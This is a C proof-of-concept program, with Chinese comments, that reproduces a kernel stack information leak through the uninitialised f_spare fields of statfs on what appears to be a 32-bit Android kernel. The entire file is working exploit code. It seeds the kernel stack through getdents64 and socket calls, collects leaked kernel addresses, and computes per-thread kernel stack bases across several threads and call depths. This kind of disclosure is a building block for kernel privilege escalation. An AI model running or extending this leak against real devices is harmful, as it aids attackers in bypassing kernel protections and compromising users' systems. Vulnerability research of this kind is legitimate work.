/* SPDX-License-Identifier: GPL-3.0-or-later */

/*
 * statfs_leak2 —— 复现 f_spare 残值，并判定它属于哪个栈
 *
 * 思路：leakfuzz4 里连续跑完 getdents / getsockopt 等之后，statfs 的
 * f_spare 出现稳定残值（如 d3609fe8），说明那是「同一内核栈位置的前任内容」。
 * 本程序：
 *   1. 先执行与 leakfuzz4 相近的污染序列
 *   2. 连续 statfs 多个挂载点，观察 f_spare 是否稳定
 *   3. 在 4 个线程里各跑一遍同样序列 → 若值不同，说明指向各自线程栈
 *   4. 在同线程内改变调用深度 → 若值平移，进一步确证
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/statfs.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int is_kaddr(uint32_t v)
{
	return v >= 0xc0000000u && v < 0xe7800000u;
}

/* 污染内核栈：走一批会深调用的 syscall，让内核栈留下指针 */
static void pollute(void)
{
	int i;
	for (i = 0; i < 8; i++) {
		int fd = open("/data", O_RDONLY | O_DIRECTORY);
		if (fd >= 0) {
			char b[1024];
			syscall(SYS_getdents64, fd, b, sizeof b);
			close(fd);
		}
	}
	{
		int s = socket(AF_INET, SOCK_DGRAM, 0);
		if (s >= 0) {
			struct sockaddr_in sa;
			socklen_t l = sizeof sa;
			getsockname(s, (struct sockaddr *)&sa, &l);
			close(s);
		}
	}
	{
		struct statfs st;
		statfs("/proc", &st);
	}
}

static void run_seq(const char *who)
{
	const char *paths[] = { "/data", "/cache", "/system", "/data/local/tmp" };
	int i;

	pollute();

	for (i = 0; i < 4; i++) {
		struct statfs st;
		memset(&st, 0, sizeof st);
		if (statfs(paths[i], &st) < 0) continue;
		printf("%-10s %-16s spare=%08lx %08lx %08lx %08lx  base8k=%08lx tid=%d\n",
		       who, paths[i],
		       (unsigned long)st.f_spare[0], (unsigned long)st.f_spare[1],
		       (unsigned long)st.f_spare[2], (unsigned long)st.f_spare[3],
		       (unsigned long)st.f_spare[0] & ~0x1ffful,
		       (int)syscall(SYS_gettid));
	}
}

static void *thr(void *p)
{
	char name[24];
	snprintf(name, sizeof name, "thr-%ld", (long)p);
	run_seq(name);
	return NULL;
}

int main(void)
{
	pthread_t t[4];
	int i;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== statfs f_spare 残值归属判定  pid=%d ===\n", getpid());

	printf("--- main 第 1 轮 ---\n"); run_seq("main");
	printf("--- main 第 2 轮 ---\n"); run_seq("main");
	printf("--- main 第 3 轮 ---\n"); run_seq("main");

	printf("--- 4 个线程各跑一遍 ---\n");
	for (i = 0; i < 4; i++)
		pthread_create(&t[i], NULL, thr, (void *)(long)i);
	for (i = 0; i < 4; i++)
		pthread_join(t[i], NULL);

	printf("--- 同线程不同深度 ---\n");
	{
		char pad[512];
		struct statfs st;
		memset(pad, 0x33, sizeof pad);
		pollute();
		memset(&st, 0, sizeof st);
		statfs("/data", &st);
		printf("depth=0  spare=%08lx base8k=%08lx\n",
		       (unsigned long)st.f_spare[0], (unsigned long)st.f_spare[0] & ~0x1ffful);
	}
	return 0;
}
